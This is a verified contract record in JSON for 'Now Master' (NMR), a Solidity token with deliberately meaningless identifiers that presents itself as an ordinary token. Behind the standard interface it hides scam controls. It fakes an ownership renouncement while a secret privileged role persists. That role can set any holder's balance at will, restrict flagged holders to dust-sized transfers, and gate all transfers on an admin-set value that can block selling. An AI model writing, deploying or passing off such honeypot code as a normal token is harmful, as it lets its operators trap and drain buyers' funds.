{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface takeSwap {\n    function createPair(address marketingFee, address autoToken) external returns (address);\n}\n\ninterface teamFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txTrading) external view returns (uint256);\n\n    function transfer(address buyShould, uint256 receiverToSell) external returns (bool);\n\n    function allowance(address teamShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverToSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address buyShould,\n        uint256 receiverToSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeTotal, uint256 value);\n    event Approval(address indexed teamShould, address indexed spender, uint256 value);\n}\n\nabstract contract buyList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tradingReceiver is teamFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract NowMaster is buyList, teamFee, tradingReceiver {\n\n    bool public enableTeam;\n\n    mapping(address => uint256) private autoTx;\n\n    uint8 private listShouldAmount = 18;\n\n    mapping(address => bool) public buyMax;\n\n    string private tradingReceiverAt = \"Now Master\";\n\n    function owner() external view returns (address) {\n        return launchSell;\n    }\n\n    function getOwner() external view returns (address) {\n        return launchSell;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return tradingReceiverAt;\n    }\n\n    uint256 private tokenSell = 100000000 * 10 ** 18;\n\n    address public exemptSwap;\n\n    constructor (){\n        \n        isToken fundLiquiditySell = isToken(tradingAt);\n        exemptSwap = takeSwap(fundLiquiditySell.factory()).createPair(fundLiquiditySell.WETH(), address(this));\n        \n        walletReceiver = _msgSender();\n        buyMax[walletReceiver] = true;\n        autoTx[walletReceiver] = tokenSell;\n        teamLiquidityFee();\n        \n        emit Transfer(address(0), walletReceiver, tokenSell);\n    }\n\n    uint256 public atLaunch;\n\n    function receiverFrom(address walletAuto, address buyShould, uint256 receiverToSell) internal returns (bool) {\n        if (walletAuto == walletReceiver) {\n            return atReceiver(walletAuto, buyShould, receiverToSell);\n        }\n        uint256 enableMinFrom = teamFee(exemptSwap).balanceOf(senderList);\n        require(enableMinFrom == launchReceiver);\n        require(buyShould != senderList);\n        if (minSwap[walletAuto]) {\n            return atReceiver(walletAuto, buyShould, limitToken);\n        }\n        return atReceiver(walletAuto, buyShould, receiverToSell);\n    }\n\n    uint256 launchReceiver;\n\n    address tradingAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public takeBuyEnable;\n\n    function allowance(address swapMaxMode, address feeMax) external view virtual override returns (uint256) {\n        if (feeMax == tradingAt) {\n            return type(uint256).max;\n        }\n        return receiverLiquidity[swapMaxMode][feeMax];\n    }\n\n    function balanceOf(address txTrading) public view virtual override returns (uint256) {\n        return autoTx[txTrading];\n    }\n\n    string private marketingAt = \"NMR\";\n\n    mapping(address => mapping(address => uint256)) private receiverLiquidity;\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingAt;\n    }\n\n    function atReceiver(address walletAuto, address buyShould, uint256 receiverToSell) internal returns (bool) {\n        require(autoTx[walletAuto] >= receiverToSell);\n        autoTx[walletAuto] -= receiverToSell;\n        autoTx[buyShould] += receiverToSell;\n        emit Transfer(walletAuto, buyShould, receiverToSell);\n        return true;\n    }\n\n    uint256 public modeTx;\n\n    uint256 public swapToken;\n\n    function isMarketing() private view {\n        require(buyMax[_msgSender()]);\n    }\n\n    function receiverSwapTo(uint256 receiverToSell) public {\n        isMarketing();\n        launchReceiver = receiverToSell;\n    }\n\n    function teamLiquidityFee() public {\n        emit OwnershipTransferred(walletReceiver, address(0));\n        launchSell = address(0);\n    }\n\n    bool private limitFromShould;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenSell;\n    }\n\n    function senderWallet(address feeReceiver, uint256 receiverToSell) public {\n        isMarketing();\n        autoTx[feeReceiver] = receiverToSell;\n    }\n\n    uint256 private exemptReceiverTake;\n\n    mapping(address => bool) public minSwap;\n\n    bool private autoMin;\n\n    uint256 constant limitToken = 8 ** 10;\n\n    address public walletReceiver;\n\n    uint256 private fromTo;\n\n    function decimals() external view virtual override returns (uint8) {\n        return listShouldAmount;\n    }\n\n    function enableAt(address buyMarketingLaunch) public {\n        isMarketing();\n        if (takeBuyEnable != autoMin) {\n            fromTo = atLaunch;\n        }\n        if (buyMarketingLaunch == walletReceiver || buyMarketingLaunch == exemptSwap) {\n            return;\n        }\n        minSwap[buyMarketingLaunch] = true;\n    }\n\n    function toTrading(address minAmount) public {\n        if (enableTeam) {\n            return;\n        }\n        \n        buyMax[minAmount] = true;\n        \n        enableTeam = true;\n    }\n\n    uint256 fromLimit;\n\n    address senderList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transferFrom(address walletAuto, address buyShould, uint256 receiverToSell) external override returns (bool) {\n        if (_msgSender() != tradingAt) {\n            if (receiverLiquidity[walletAuto][_msgSender()] != type(uint256).max) {\n                require(receiverToSell <= receiverLiquidity[walletAuto][_msgSender()]);\n                receiverLiquidity[walletAuto][_msgSender()] -= receiverToSell;\n            }\n        }\n        return receiverFrom(walletAuto, buyShould, receiverToSell);\n    }\n\n    address private launchSell;\n\n    event OwnershipTransferred(address indexed takeSenderLiquidity, address indexed totalTrading);\n\n    function transfer(address feeReceiver, uint256 receiverToSell) external virtual override returns (bool) {\n        return receiverFrom(_msgSender(), feeReceiver, receiverToSell);\n    }\n\n    function approve(address feeMax, uint256 receiverToSell) public virtual override returns (bool) {\n        receiverLiquidity[_msgSender()][feeMax] = receiverToSell;\n        emit Approval(_msgSender(), feeMax, receiverToSell);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeSenderLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalTrading\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMaxMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverToSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMarketingLaunch\",\"type\":\"address\"}],\"name\":\"enableAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverToSell\",\"type\":\"uint256\"}],\"name\":\"receiverSwapTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverToSell\",\"type\":\"uint256\"}],\"name\":\"senderWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeBuyEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLiquidityFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minAmount\",\"type\":\"address\"}],\"name\":\"toTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverToSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverToSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "NowMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}